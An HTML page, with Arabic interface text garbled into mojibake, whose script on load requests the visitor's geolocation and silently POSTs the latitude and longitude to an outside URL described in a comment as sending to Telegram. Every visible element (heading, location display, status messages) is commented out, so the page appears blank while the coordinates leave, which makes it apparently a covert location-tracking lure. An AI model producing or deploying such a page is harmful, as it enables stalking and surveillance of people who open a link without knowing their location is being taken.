<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <!-- <title>Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ù…ÙˆÙ‚Ø¹ Ø¥Ù„Ù‰ ØªÙ„ØºØ±Ø§Ù…</title> -->
    <style>
        body { direction: rtl; text-align: center; font-family: Arial; padding: 20px; }
        #location { font-size: 20px; margin: 20px; padding: 15px; background: #f0f0f0; }
    </style>
</head>
<body>
    <!-- <h1>ğŸŒ Ø§Ù„Ù…ÙˆÙ‚Ø¹ Ø§Ù„Ø¬ØºØ±Ø§ÙÙŠ</h1> -->
    <!-- <div id="location">Ø¬Ø§Ø±ÙŠ ØªØ­Ø¯ÙŠØ¯ Ø§Ù„Ù…ÙˆÙ‚Ø¹...</div>
    <div id="result"></div> -->

    <script>
        let coords = {};
        
        window.onload = function() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    position => {
                        coords = position.coords;
                        // document.getElementById('location').innerHTML = `
                        //     Ø®Ø· Ø§Ù„Ø¹Ø±Ø¶: ${coords.latitude}<br>
                        //     Ø®Ø· Ø§Ù„Ø·ÙˆÙ„: ${coords.longitude}
                        // `;
                        sendToTelegram()
                    },
                    // error => {
                    //     document.getElementById('location').textContent = 
                    //         'Ø®Ø·Ø£ ÙÙŠ Ø§Ù„Ø­ØµÙˆÙ„ Ø¹Ù„Ù‰ Ø§Ù„Ù…ÙˆÙ‚Ø¹: ' + error.message;
                    // }
                );
            } else {
                document.getElementById('location').textContent = 
                    'Ø§Ù„Ù…ØªØµÙØ­ Ù„Ø§ ÙŠØ¯Ø¹Ù… Ø®Ø¯Ù…Ø© Ø§Ù„Ù…ÙˆÙ‚Ø¹ Ø§Ù„Ø¬ØºØ±Ø§ÙÙŠ';
            }
            
        };

        async function sendToTelegram() {
            // const btn = document.getElementById('sendBtn');
            // btn.disabled = true;
            // btn.textContent = 'Ø¬Ø§Ø±ÙŠ Ø§Ù„Ø¥Ø±Ø³Ø§Ù„...';
            
            try {
                const response = await fetch('https://baroniqq.github.io/alii/send-location', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        lat: coords.latitude,
                        lng: coords.longitude
                    })
                });

                const result = await response.json();
                if (result.ok) {
                    // document.getElementById('result').innerHTML = 
                    //     'âœ… ØªÙ… Ø§Ù„Ø¥Ø±Ø³Ø§Ù„ Ø¨Ù†Ø¬Ø§Ø­ Ø¥Ù„Ù‰ ØªÙ„ØºØ±Ø§Ù…';
                } else {
                    throw new Error(result.error);
                }
            } catch (error) {
                // document.getElementById('result').innerHTML = 
                //     'âŒ Ø®Ø·Ø£ ÙÙŠ Ø§Ù„Ø¥Ø±Ø³Ø§Ù„: ' + error.message;
            } finally {
                // btn.disabled = false;
                // btn.textContent = 'Ø¥Ø±Ø³Ø§Ù„ Ø¥Ù„Ù‰ ØªÙ„ØºØ±Ø§Ù…';
            }
        }
    </script>
</body>
</html>
